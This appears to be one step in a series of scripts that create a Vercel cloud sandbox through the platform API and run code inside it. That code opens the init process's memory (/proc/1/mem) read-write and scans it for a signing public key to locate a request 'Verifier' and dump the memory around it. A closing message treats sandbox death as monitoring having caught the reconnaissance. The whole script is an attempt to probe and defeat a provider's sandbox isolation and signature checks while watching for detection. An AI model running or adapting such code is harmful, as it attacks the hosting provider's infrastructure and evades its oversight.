# 实验J199: 逐页扫arena(处理EIO空洞)找公钥32字节 -> 定位Verifier实例
# j198: rodata/data/bss无公钥; arena读EIO(稀疏映射); 头名确认X-Signature/X-Timestamp
# 本步: 4KB步进+EIO跳过 扫0x287d30400000-0x287d30c00000 -> 命中则dump上下文
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def bashfile(sid, cmd, label, n=26000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "bash", "args": ["-c", cmd], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj199"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

CODE = r'''
import os, time
out = open("/tmp/d199.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
p("start")

fd = os.open("/proc/1/mem", os.O_RDWR)
def read_at(addr, n):
    os.lseek(fd, addr, 0)
    return os.read(fd, n)

PK = bytes.fromhex("59537c81c920570284aee2ea2929144e5d1e37260343391e521feb19e68e2541")
B64 = b"WVN8gckgVwKEruLqKSkUTl0eNyYDQzkeUh/rGeaOJUE"

def scan_pages(start, end, pat, tag, maxhits=10):
    """4KB步进扫描, EIO跳过"""
    hits = []
    pages_mapped = 0
    t0 = time.time()
    off = start
    while off < end:
        try:
            os.lseek(fd, off, 0)
            b = os.read(fd, 4096)
            if len(b) < 4096:
                # 页尾不完整, 只处理已有部分
                pass
            pages_mapped += 1
            i = b.find(pat)
            while i >= 0 and len(hits) < maxhits:
                hits.append(hex(off + i))
                i = b.find(pat, i + 1)
        except OSError:
            pass  # EIO 未映射页
        off += 4096
    p("SCAN", tag, "mapped_pages", pages_mapped, "hits", len(hits), hits,
      "secs", round(time.time() - t0, 1))
    return hits

# PA: 扫arena第一块64MB
p("CP", "PA")
h1 = scan_pages(0x287d30400000, 0x287d30c00000, PK, "PK_ARENA1")
h2 = scan_pages(0x287d30400000, 0x287d30c00000, B64, "B64_ARENA1")
hits = h1 or h2
if not hits:
    # 扩展到第二块arena 0x287d30c00000 - 0x287d31400000
    p("CP", "PA2")
    h3 = scan_pages(0x287d30c00000, 0x287d31400000, PK, "PK_ARENA2")
    h4 = scan_pages(0x287d30c00000, 0x287d31400000, B64, "B64_ARENA2")
    hits = h3 or h4
    if not hits:
        # 第三块
        p("CP", "PA3")
        h5 = scan_pages(0x287d31400000, 0x287d31c00000, PK, "PK_ARENA3")
        h6 = scan_pages(0x287d31400000, 0x287d31c00000, B64, "B64_ARENA3")
        hits = h5 or h6

# PB: dump命中上下文
p("CP", "PB")
if hits:
    a = int(hits[0], 16)
    base = a - 0x40
    b = read_at(base, 0x100)
    p("CTX", hex(base), b.hex())
    s = "".join(chr(c) if 32 <= c < 127 else "." for c in b)
    p("CTX_ascii", repr(s))
    # 扫同一页里的其他字段(找Verifier结构: 公钥可能前后有长度/指针字段)
    pg = (a // 4096) * 4096
    b = read_at(pg, 4096)
    p("PAGE", hex(pg), b.hex())
else:
    p("NO_PK_FOUND")
p("done")
out.close()
os.close(fd)
'''

st = run_cmd(sid, CODE, "J199", timeout=290)
time.sleep(2)
bashfile(sid, "cat /tmp/d199.txt", "marker", 22000)
if st == "DEAD":
    print("\n!!! DEATH -> 侦察触发监控", flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
